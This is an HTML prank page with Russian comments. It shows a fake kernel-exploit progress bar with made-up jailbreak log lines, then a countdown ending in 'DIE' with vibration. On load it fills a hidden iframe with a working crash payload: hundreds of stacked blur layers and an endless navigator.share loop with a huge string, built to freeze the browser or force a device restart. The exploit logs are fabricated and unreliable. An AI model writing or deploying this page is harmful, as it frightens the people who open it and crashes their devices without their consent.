<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Kernel Exploiting...</title>
    <style>
        body {
            background: #000; color: #00ff00;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; margin: 0; font-family: monospace; overflow: hidden;
        }

        .terminal-container { width: 90%; max-width: 500px; padding: 20px; }

        /* Прогресс-бар */
        .progress-container {
            width: 100%; border: 1px solid #333; height: 10px; margin-bottom: 20px;
        }
        .progress-bar {
            width: 0%; height: 100%; background: #00ff00; transition: width 0.1s;
        }

        #console { font-size: 12px; height: 150px; overflow: hidden; }
        .line { margin-bottom: 5px; opacity: 0; animation: fadeIn 0.1s forwards; }
        @keyframes fadeIn { to { opacity: 1; } }

        /* Экран смерти */
        #countdown {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #ff3b30; font-size: 120px;
            font-weight: bold; justify-content: center; align-items: center; z-index: 100;
        }

        /* Эффект красной вспышки */
        .glitch { animation: flash 0.2s infinite; }
        @keyframes flash { 0% { background: #000; } 50% { background: #200; } 100% { background: #000; } }

        #respring-iframe { position: fixed; opacity: 0.01; pointer-events: none; }
    </style>
</head>
<body>

    <div id="terminal" class="terminal-container">
        <div class="progress-container"><div id="bar" class="progress-bar"></div></div>
        <div id="console"></div>
    </div>

    <div id="countdown"></div>

    <iframe id="respring-iframe" sandbox="allow-forms allow-modals allow-scripts allow-same-origin"></iframe>

    <script>
        const logs = [
            "[!] Exploit initialised",
            "[!] Overwriting kernel memory...",
            "[!] Found offset: 0xfffffff007004000",
            "[!] Bypassing KPP...",
            "[!] Rootfs remounted as RW",
            "[!] Injecting tweaks...",
            "[X] CRITICAL MEMORY LEAK DETECTED"
        ];

        let barWidth = 0;
        const bar = document.getElementById('bar');
        const consoleEl = document.getElementById('console');

        // 1. Сначала идет прогресс-бар
        const load = setInterval(() => {
            barWidth += 2;
            bar.style.width = barWidth + "%";
            if (barWidth >= 100) {
                clearInterval(load);
                addLogs(0);
            }
        }, 30);

        // 2. Потом идут логи
        function addLogs(index) {
            if (index < logs.length) {
                const div = document.createElement('div');
                div.className = 'line';
                div.innerText = logs[index];
                consoleEl.appendChild(div);
                setTimeout(() => addLogs(index + 1), 400);
            } else {
                setTimeout(triggerFinal, 500);
            }
        }

        // 3. Финальный отсчет
        function triggerFinal() {
            document.getElementById('terminal').style.display = 'none';
            const cd = document.getElementById('countdown');
            cd.style.display = 'flex';
            cd.classList.add('glitch');
            
            let count = 3;
            cd.innerText = count;
            
            const timer = setInterval(() => {
                count--;
                if (count > 0) {
                    cd.innerText = count;
                    if (navigator.vibrate) navigator.vibrate(200); // Вибрация!
                } else {
                    clearInterval(timer);
                    cd.innerText = "DIE";
                    startRespring();
                }
            }, 1000);
        }

        function startRespring() {
            const frame = document.getElementById('respring-iframe');
            frame.srcdoc = `<html><body><script>
                const c = document.createElement('div');
                c.style.cssText = 'perspective: 1px; perspective-origin: 99% 99%;';
                document.body.appendChild(c);
                for (let i = 0; i < 500; i++) {
                    let d = document.createElement('div');
                    d.style.cssText = 'position:absolute; width:100vw; height:100vh; backdrop-filter:blur(100px); -webkit-backdrop-filter:blur(100px); transform:translate3d(100px,100px,'+i+'px);';
                    c.appendChild(d);
                }
                setInterval(() => {
                    try { navigator.share({title:'R', text:'R'.repeat(100000)}); } catch(e){}
                }, 0);
            <\/script></body></html>`;
        }
    </script>
</body>
</html>
